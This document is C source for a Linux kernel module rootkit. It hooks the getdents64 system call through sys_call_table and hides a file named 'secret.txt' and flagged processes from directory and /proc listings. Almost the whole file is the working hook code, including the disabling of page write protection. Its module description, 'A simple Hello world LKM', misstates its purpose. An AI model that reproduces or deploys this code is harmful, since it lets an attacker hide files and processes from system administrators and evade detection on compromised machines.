#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/sched/signal.h>
#include <linux/proc_ns.h>
#include <linux/fs_struct.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/security.h>
#define INVISIBLE 0x10000000
#define HIDE_ME "secret.txt"
struct files_struct;
unsigned long *sys_call_table;
asmlinkage long unsigned (*org_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
struct task_struct * find_task(pid_t pid)
{
    struct task_struct *p = current;
    for_each_process(p){
        if (p->pid == pid)
            return p;
    }
    return NULL;
}
int is_invisible(pid_t pid)
{
    struct task_struct *task;
    if (!pid)
        return 0;
    task = find_task(pid);
    if (!task)
        return 0;
    if (task->flags & INVISIBLE)
        return 1;
    return 0;
}
asmlinkage long sys_getdents64_hook (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    int ret = org_getdents64(fd, dirent, count), err, proc =0;
    struct linux_dirent64 *dir, *kdirent, *prev =NULL;
    struct inode* d_inode;
    unsigned long i =0;
    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
        d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
    #else
	    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    #endif

    //using the real syscall for getting the info
    if (ret <=0)
        return ret;
    kdirent = kvzalloc(ret, GFP_KERNEL); //alloc memory to kdirent
    if (kdirent == NULL)
        return ret;
    err = copy_from_user(kdirent, dirent, ret);//copy from user space: >ret< from >dirent< to >kdirent<
    if (err)
        goto out;
    
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;

    while (i < ret)
    {
        /*
        //######
        inside the loop we running through the
         struct that was return from the real getdents, then we take everyfile name using the 
         linux_dirent64 cur whish is assigend by dirp that is the linux_dirent64 struct of the 
         file we recive from getdents, we take his struct member d_name (which contain the file name) 
         and then we compre it to the file name that we want to hide. if thier equal we get rid with that 
         (explain later how) and then contiune*/
        dir = (void*) kdirent +i;
        // in strcmp return 0 means strings are equal
        if (((!proc && (memcmp(HIDE_ME, dir->d_name, strlen(HIDE_ME))) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
        {  
            if (dir == kdirent){
                ret -= dir->d_reclen;
                memmove(dir, (void*)dir + dir->d_reclen, ret);// putting in dir the next dir in the buff
                printk(KERN_ALERT "found it!");
                continue;
            } 
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;
        i+=dir->d_reclen;//incrise the offset for the while expersion
    }
    err = copy_to_user(dirent, kdirent, ret);
    if (err)//using out for regular out and not for error out
        goto out;
out:
    kvfree(kdirent);
    return ret;
}

int set_page_write(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        return 1;
    }
    return 0;
}
void set_page_no_write(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}
int replace_getdents_syscall(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    if (sys_call_table != 0)
    {
        if (set_page_write((unsigned long) sys_call_table))
        {
            //unsigned long orig_cr0 = read_cr0();
            //write_cr0(orig_cr0 &( ~0x10000));
            printk(KERN_ALERT "edit cr0 to write ");
            org_getdents64 = (long unsigned int (*)(unsigned int,  struct linux_dirent64 *, unsigned int))sys_call_table[__NR_getdents64];
            sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
            set_page_no_write((unsigned long)sys_call_table);
            printk(KERN_ALERT "edit cr0 to no write ");

            return 1;
        }
        return 0;

    }
    return 0;

}
void remove_hook(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    if (sys_call_table != 0)
     if (set_page_write((unsigned long) sys_call_table))
        {
            printk(KERN_ALERT "edit cr0 to write ");
            sys_call_table[__NR_getdents64] = (unsigned long int)org_getdents64;
            set_page_no_write((unsigned long) sys_call_table);
                printk(KERN_ALERT "edit cr0 to no write");
            return ;
        }
}
static int __init getdents_hook_init(void)
{
    printk(KERN_ALERT "load the module");
    if (!replace_getdents_syscall())
    {  
        printk(KERN_ALERT "error, couldent replace the getdents64");
        return -1;
    }
    printk(KERN_ALERT "load the module secsessfully!");
    return 1;
}
static void __exit unload(void)
{
    remove_hook();
}
module_init(getdents_hook_init);
module_exit(unload);

MODULE_AUTHOR("Akshat Sinha"); 
MODULE_DESCRIPTION("A simple Hello world LKM!"); 
MODULE_LICENSE("GPL"); 
MODULE_VERSION("0.1"); 